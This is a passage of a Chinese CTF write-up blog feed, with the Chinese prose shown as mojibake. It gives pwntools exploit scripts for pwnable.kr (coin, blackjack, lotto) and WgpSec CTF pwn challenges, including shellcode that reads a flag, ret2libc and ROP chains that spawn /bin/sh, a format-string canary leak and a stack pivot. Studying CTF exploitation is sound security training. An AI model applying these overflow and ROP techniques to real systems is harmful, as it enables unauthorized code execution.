- è¿™ä¸ªè¿‡ç¨‹ä¼šéšç€ç¡¬å¸æ•°é‡çš„å‡å°‘è€Œé€æ­¥ç¼©å°æœç´¢èŒƒå›´ï¼Œç›´åˆ°æ‰¾åˆ°ä¼ªé€ çš„ç¡¬å¸ã€‚

<span class="token comment">### æ•°å­¦åˆ†æï¼š</span>

åœ¨æœ€åæƒ…å†µä¸‹ï¼Œè§£å†³è¯¥é—®é¢˜æ‰€éœ€çš„æœ€å¤§ç§°é‡æ¬¡æ•° <span class="token variable"><span class="token variable">`</span>C<span class="token variable">`</span></span> æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š

<span class="token punctuation">\</span><span class="token punctuation">[</span>
<span class="token number">2</span>^C <span class="token punctuation">\</span>geq N
<span class="token punctuation">\</span><span class="token punctuation">]</span>

è¿™æ„å‘³ç€ <span class="token variable"><span class="token variable">`</span>C<span class="token variable">`</span></span> æ¬¡ç§°é‡å¯ä»¥å¤„ç†æœ€å¤š <span class="token variable"><span class="token variable">`</span><span class="token number">2</span>^C<span class="token variable">`</span></span> æšç¡¬å¸ã€‚

<span class="token comment">### æ€»ç»“ï¼š</span>

é€šè¿‡å°†ç¡¬å¸åˆ†ç»„ç§°é‡ï¼Œä½ å¯ä»¥åœ¨æœ‰é™çš„ç§°é‡æ¬¡æ•°å†…é€æ­¥ç¼©å°å‡å¸æ‰€åœ¨çš„èŒƒå›´ï¼Œæœ€ç»ˆç¡®å®šé‚£æšä¼ªé€ çš„ç¡¬å¸ã€‚è¿™æ˜¯ä¸€ç§å…¸å‹çš„åˆ†è€Œæ²»ä¹‹çš„ç­–ç•¥ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>ç›´æ¥éšä¾¿å¼€ä¸€ä¸ªæœºå­ï¼Œç„¶ååœ¨&#x2F;tmpé‡Œé¢åˆ›å»ºä¸€ä¸ªpyè„šæœ¬æ‰“æœ¬åœ°å°±è¡Œã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># python(2) solve.py</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> re

p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">,</span> <span class="token number">9007</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  N<span class="token punctuation">,</span> C <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"N=(\d+) C=(\d+)"</span><span class="token punctuation">,</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
  N <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span>
  C <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>C<span class="token punctuation">)</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span>N<span class="token punctuation">,</span> C<span class="token punctuation">)</span>

  start<span class="token punctuation">,</span> end <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> N<span class="token operator">-</span><span class="token number">1</span>

  <span class="token keyword">while</span> start <span class="token operator">&lt;=</span> end <span class="token keyword">and</span> C <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
    mid <span class="token operator">=</span> <span class="token punctuation">(</span>start <span class="token operator">+</span> end<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
    x <span class="token operator">=</span> <span class="token string">" "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> mid<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>	<span class="token comment"># build range list</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
    
    res <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> res <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
      start <span class="token operator">=</span> mid<span class="token operator">+</span><span class="token number">1</span>	<span class="token comment"># through first half</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
      end <span class="token operator">=</span> mid<span class="token operator">-</span><span class="token number">1</span>		<span class="token comment"># through second half</span>
    C <span class="token operator">-=</span> <span class="token number">1</span>

  <span class="token keyword">while</span> C <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>	<span class="token comment"># use all the tries</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    C <span class="token operator">-=</span> <span class="token number">1</span>

  p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">)</span>	<span class="token comment"># final answer</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<h5 id="ç¬¬åäºŒé¢˜-blackjack"><a href="#ç¬¬åäºŒé¢˜-blackjack" class="headerlink" title="ç¬¬åäºŒé¢˜-blackjack"></a>ç¬¬åäºŒé¢˜-blackjack</h5><p>è¿™é¢˜å¥½åƒæ˜¯è®©æˆ‘èµšé’±ï¼Œæ²¡çœ‹æ‡‚éšä¾¿å†™ç‚¹æ•°ï¼Œå°±ç»™ä»–æ‰“é€šäº†ã€‚</p>
<blockquote>
<p> $ nc pwnable.kr 9009</p>
<pre><code>    222         111
   222 222       11111
   222  222      11 111
     222        111
     222        111
</code></pre>
<p>CCCCC   SS       DD     HHHHH   C   C<br> C   C   SS      D  D    H   H  C  C<br> C   C   SS      D   D   H      C  C<br> CCCCC   SS      D DD D   H      C C<br> C   C   SS     D DDDD D   H      CC C<br> C   C  SS     D    D   H      C  C<br> C   C  SS     D     D   H   H  C   C<br> CCCCCC   SSSSSSS  D     D   HHHHH   C   C</p>
<p>â€‹            21<br>â€‹    DDDDDDDD    HH     CCCCC   S   S<br>â€‹     DD     H  H    C   C  S  S<br>â€‹     DD    H   H   C      S  S<br>â€‹     DD    H HH H   C      S S<br>â€‹     DD    H HHHH H   C      SS S<br>â€‹     DD    H    H   C      S  S<br>â€‹    D  DD   H     H   C   S  S   C<br>â€‹    DDD    H     H   CCCCC   S   S</p>
<p>â€‹     222           111<br>â€‹     222            111<br>â€‹     222            111<br>â€‹    222222222222222    111111111111111<br>â€‹    2222222222222222   11111111111111111</p>
<pre><code>      Are You Ready?
     \----------------
        (Y/N)
         y
</code></pre>
<p>Enter 1 to Begin the Greatest Game Ever Played.<br> Enter 2 to See a Complete Listing of Rules.<br> Enter 3 to Exit Game. (Not Recommended)<br> Choice: 1</p>
<p>Cash: $500<br> -â€”â€”<br> |S   |<br> |  6  |<br> |   S|<br> -â€”â€”</p>
<p>Your Total is 6</p>
<p>The Dealer Has a Total of 8</p>
<p>Enter Bet: $111111111111</p>
<p> Would You Like to Hit or Stay?<br> Please Enter H to Hit or S to Stay.<br> s</p>
<p>You Have Chosen to Stay at 6. Wise Decision!</p>
<p>The Dealer Has a Total of 11<br> The Dealer Has a Total of 14<br> The Dealer Has a Total of 17<br> Dealer Has the Better Hand. You Lose.</p>
<p>You have 0 Wins and 1 Losses. Awesome!</p>
<p>Would You Like To Play Again?<br> Please Enter Y for Yes or N for No<br> y<br> YaY_I_AM_A_MILLIONARE_LOL</p>
<p> Cash: $558039085<br> -â€”â€”<br> |H   |<br> |  K  |<br> |   H|<br> -â€”â€”</p>
<p>Your Total is 10</p>
<p>The Dealer Has a Total of 5</p>
<p>Enter Bet: $</p>
</blockquote>
<p>åº”è¯¥æ˜¯æœ‰æº¢å‡ºç‚¹ï¼Œç„¶åä¼°è®¡å°±æ˜¯æœºç»„çš„çŸ¥è¯†äº†ã€‚</p>
<p><img src="https://s2.loli.net/2024/08/19/r1WRmxwEopJlLaF.png" alt="a6f877bc85a64a42a40a656cbee3b228.png"></p>
<h5 id="ç¬¬åä¸‰é¢˜-lotto"><a href="#ç¬¬åä¸‰é¢˜-lotto" class="headerlink" title="ç¬¬åä¸‰é¢˜-lotto"></a>ç¬¬åä¸‰é¢˜-lotto</h5><p>å¯ä»¥çœ‹åˆ°å¤–å±‚åªè¦ä¸€æ¬¡è¢«å‘½ä¸­ï¼Œé‡Œå±‚å°±æ‰§è¡Œ6æ¬¡æ­£å¥½æ»¡è¶³æ¡ä»¶äº†ã€‚ä»–è¾“çš„asciiè¦æ˜¯1-45.</p>
<p><img src="https://s2.loli.net/2024/08/19/QObHFxG2aLu5KSk.png" alt="4d56948487234ccc9d72f3d69e0244a2.png"></p>
<p>éšä¾¿æ‰¾ä¸€ä¸ªå§</p>
<p><img src="https://s2.loli.net/2024/08/19/KATPc5LokF31YIi.png" alt="4c7650075f854b9ebd3030798ca4bded.png"></p>
<p>expï¼Œå¦‚æœæœ¬åœ°æ‰“çš„å¾ˆæ…¢ï¼Œå¯ä»¥ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Šæ‰“ã€‚ </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>

sh <span class="token operator">=</span> ssh<span class="token punctuation">(</span><span class="token string">'lotto'</span><span class="token punctuation">,</span> <span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">'guest'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">2222</span><span class="token punctuation">)</span>
io <span class="token operator">=</span> sh<span class="token punctuation">.</span>process<span class="token punctuation">(</span>executable<span class="token operator">=</span><span class="token string">'./lotto'</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
  io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
  io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'!!!!!!'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  _ <span class="token punctuation">,</span> ans <span class="token operator">=</span> io<span class="token punctuation">.</span>recvlines<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
  
  <span class="token keyword">if</span> <span class="token string">"bad"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> ans<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span>ans<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>æœ€åå¾—åˆ°flag</p>
<p><img src="https://s2.loli.net/2024/08/19/e7GxpZuWKoFfwMX.png" alt="cf9a102c4dae44c39cb0f5e21fd0ff07.png"></p>
]]></content>
      <categories>
        <category>å­¦ä¹ </category>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title>WgpSec_CTFçš„pwnç³»åˆ—</title>
    <url>/2024/08/15/wgpsec-ctf%E7%9A%84pwn%E7%B3%BB%E5%88%97/</url>
    <content><![CDATA[<blockquote>
<p> é¢˜ç›®é“¾æ¥ï¼Œ<a href="https://ctf.wgpsec.org/">WgpSec CTF</a></p>
</blockquote>
<p><strong>ç›®å½•</strong></p>
<p><a href="#1%EF%BC%8Cret2shellcode">1ï¼Œret2shellcode</a></p>
<p><a href="#%E6%9C%89%E6%89%A7%E8%A1%8C%E6%9D%83%E9%99%90%E7%9B%B4%E6%8E%A5%E6%89%A7%E8%A1%8Cshellcode%E3%80%82">æœ‰æ‰§è¡Œæƒé™ç›´æ¥æ‰§è¡Œshellcodeã€‚</a></p>
<p><a href="#2%EF%BC%8Cezlibc">2ï¼Œezlibc </a></p>
<p><a href="#3%EF%BC%8Cfomat_leak">3ï¼Œfomat_leak</a></p>
<p><a href="#4%EF%BC%8Crand">4ï¼Œrand</a></p>
<p><a href="#5%EF%BC%8Cstack_migration">5ï¼Œstack_migration</a></p>
<hr>
<h5 id="1ï¼Œret2shellcode"><a href="#1ï¼Œret2shellcode" class="headerlink" title="1ï¼Œret2shellcode"></a>1ï¼Œret2shellcode</h5><h5 id="æœ‰æ‰§è¡Œæƒé™ç›´æ¥æ‰§è¡Œshellcodeã€‚"><a href="#æœ‰æ‰§è¡Œæƒé™ç›´æ¥æ‰§è¡Œshellcodeã€‚" class="headerlink" title="æœ‰æ‰§è¡Œæƒé™ç›´æ¥æ‰§è¡Œshellcodeã€‚"></a>æœ‰æ‰§è¡Œæƒé™ç›´æ¥æ‰§è¡Œshellcodeã€‚</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    pl <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span>
    pl <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0xDEAD1000</span><span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span>
    pl <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0xDEAD1000</span><span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span>
    shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">" here:\n"</span><span class="token punctuation">)</span>
    s<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
        
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p><img src="https://s2.loli.net/2024/08/19/h9I87lkWduoHtfn.png" alt="0bb785dcedfb4b43b87df9a4a4b4b311.png"></p>
<h5 id="2ï¼Œezlibc"><a href="#2ï¼Œezlibc" class="headerlink" title="2ï¼Œezlibc"></a>2ï¼Œezlibc</h5><p>é¢˜ç›®libcç»™äº†ã€‚æ­£å¸¸çš„ret2libcï¼Œæ³¨æ„æ ˆå¯¹é½å°±è¡Œ</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    ru<span class="token punctuation">(</span><span class="token string">"Give me some msg!\n"</span><span class="token punctuation">)</span>
    puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
    puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
    main <span class="token operator">=</span> <span class="token number">0x4011bd</span>
    pop_rdi <span class="token operator">=</span> <span class="token number">0x401273</span>
    ret <span class="token operator">=</span> <span class="token number">0x040101a</span>
    pl <span class="token operator">=</span> cyclic<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    puts <span class="token operator">=</span> uu64<span class="token punctuation">(</span><span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">,</span>puts<span class="token punctuation">)</span>

    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/da1sy/pwn_attachment/WgpSec_CTF/ezlibc/lib/x86_64-linux-gnu/libc-2.31.so"</span><span class="token punctuation">)</span>
    libc_base <span class="token operator">=</span> puts <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
    lg<span class="token punctuation">(</span><span class="token string">"libc_base"</span><span class="token punctuation">,</span>libc_base<span class="token punctuation">)</span>
    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>
    bin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"/bin/sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">"Give me some msg!\n"</span><span class="token punctuation">)</span>
    pl <span class="token operator">=</span> cyclic<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>  <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
    s<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    <span class="token comment"># gdb()</span>
exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p><img src="https://s2.loli.net/2024/08/19/XqZdsQHf1OnCS6E.png" alt="c08abaf2fd7e46db856dde7c086af778.png"></p>
<h5 id="3ï¼Œfomat-leak"><a href="#3ï¼Œfomat-leak" class="headerlink" title="3ï¼Œfomat_leak"></a>3ï¼Œfomat_leak</h5><p>fmtæ³„éœ²canaryï¼Œç„¶åç›´æ¥æ§åˆ¶ç¨‹åºæ‰§è¡Œæµåˆ°systemå°±è¡Œï¼Œä¹Ÿè¦æ³¨æ„æ ˆå¯¹é½</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">" Canary?\n"</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">"%11$p"</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">"Canary think it too!\n"</span><span class="token punctuation">)</span>
    canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">"canary"</span><span class="token punctuation">,</span>canary<span class="token punctuation">)</span>
    
    sh <span class="token operator">=</span> <span class="token number">0x402008</span>
    system <span class="token operator">=</span> <span class="token number">0x4010b0</span>
    pop_rdi <span class="token operator">=</span> <span class="token number">0x401353</span>
    ret <span class="token operator">=</span> <span class="token number">0x40101a</span>
    <span class="token comment"># ogg=[0xe3afe,0xe3b01,0xe3b04]</span>
    pl <span class="token operator">=</span> cyclic<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xaaaa</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">" say?\n"</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    <span class="token comment"># gdb()</span>
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p><img src="https://s2.loli.net/2024/08/19/z3ycv8rTofaMYet.png" alt="562e8677d3b043189857f82b2ece78ba.png"></p>
<h5 id="4ï¼Œrand"><a href="#4ï¼Œrand" class="headerlink" title="4ï¼Œrand"></a>4ï¼Œrand</h5><p>ä¼ªéšæœºæ•°ï¼Œå¤šæ‰§è¡Œäº†å‡ æ¬¡ã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    lib <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"/usr/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>
    lib<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        v4 <span class="token operator">=</span> lib<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">100</span><span class="token operator">+</span><span class="token number">1</span>
        ru<span class="token punctuation">(</span><span class="token string">"Give me you number~~~\n"</span><span class="token punctuation">)</span>
        sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

exp<span class="token punctuation">(</span><span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p><img src="https://s2.loli.net/2024/08/19/yOhApl7KuPn34f5.png" alt="7b50e040e7d44fe1aae2186861905606.png"></p>
<h5 id="5ï¼Œstack-migration"><a href="#5ï¼Œstack-migration" class="headerlink" title="5ï¼Œstack_migration"></a>5ï¼Œstack_migration</h5><p>æ ˆè¿ç§»ï¼Œè¿ç§»å›æ ˆä¸Šæ‰§è¡Œæ„é€ çš„ropé“¾</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    ru<span class="token punctuation">(</span><span class="token string">"here ["</span><span class="token punctuation">)</span>
    buf <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>

    pop_rdi <span class="token operator">=</span> <span class="token number">0x4012d3</span>
    ret <span class="token operator">=</span> <span class="token number">0x40101a</span>
    system <span class="token operator">=</span> <span class="token number">0x401090</span>
    leave_ret <span class="token operator">=</span> <span class="token number">0x401264</span>
    lg<span class="token punctuation">(</span><span class="token string">"buf"</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span>

    pl <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xa</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x28</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'/bin/sh\x00'</span>
    pl <span class="token operator">=</span> pl<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span>
    pl <span class="token operator">+=</span> p64<span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>
